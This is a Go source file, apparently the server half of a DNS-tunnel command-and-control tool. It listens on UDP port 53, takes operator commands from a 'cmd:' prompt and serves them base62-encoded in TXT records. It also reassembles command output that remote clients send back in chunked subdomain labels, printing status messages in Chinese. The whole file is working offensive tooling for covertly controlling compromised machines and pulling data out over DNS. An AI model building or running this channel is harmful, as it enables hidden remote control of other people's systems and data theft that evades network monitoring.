package main

import (
	"bufio"
	"fmt"
	"github.com/jxskiss/base62"
	"github.com/miekg/dns"
	"hash/crc32"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	resultMap := make(map[string]map[string]string)
	cmdMap := make(map[string]string)

	go dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
		var resp dns.Msg
		resp.SetReply(req)
		for _, q := range req.Question {
			str1 := strings.Split(q.Name, ".")
			str2 := strings.Split(str1[0], "-")
			if len(str2) == 3 {
				delete(cmdMap, str2[0])
				data, err := base62.Decode([]byte(str2[2]))

				if err == nil {
					//log.Printf(string(data))
				} else {
					//log.Printf("err data :" + str2[2])
					return
				}
				result := make(map[string]string)
				value, ok := resultMap[str2[0]]
				if ok {
					result = value
				} else {
					result = make(map[string]string)
					fmt.Println("开始接收:" + str2[0])
				}
				result[str2[1]] = string(data)
				resultMap[str2[0]] = result

				if str2[1] == "ffffff" {
					outdata := ""
					for i := 0; i < (len(resultMap[str2[0]]) - 1); i++ {
						value, ok := resultMap[str2[0]][strconv.FormatInt(int64(i), 16)]
						if ok {
							outdata = outdata + value
						} else {
							result = make(map[string]string)
							fmt.Println("损坏的数据 缺少分片:" + strconv.FormatInt(int64(i), 16))
						}
					}
					outdata = outdata + string(data)
					fmt.Println(str2[0] + " 接收完毕:\n" + outdata)
					delete(resultMap, str2[0])
				}

			}

			for k, v := range cmdMap {
				asw := dns.TXT{
					Hdr: dns.RR_Header{
						Name:   q.Name,
						Rrtype: dns.TypeTXT,
						Class:  dns.ClassINET,
						Ttl:    0,
					},
					Txt: []string{k + "|" + string(base62.Encode([]byte(v)))},
				}
				resp.Answer = append(resp.Answer, &asw)
			}

		}
		w.WriteMsg(&resp)
	})
	go dns.ListenAndServe(":53", "udp", nil)
	reader := bufio.NewReader(os.Stdin)
	for {
		print("cmd: ")
		text, _ := reader.ReadString('\n')
		cmdMap[strconv.FormatInt(int64(crc32.ChecksumIEEE([]byte(text[0:len(text)-1])))+time.Now().Unix(), 16)] = text[0 : len(text)-1]
	}

}
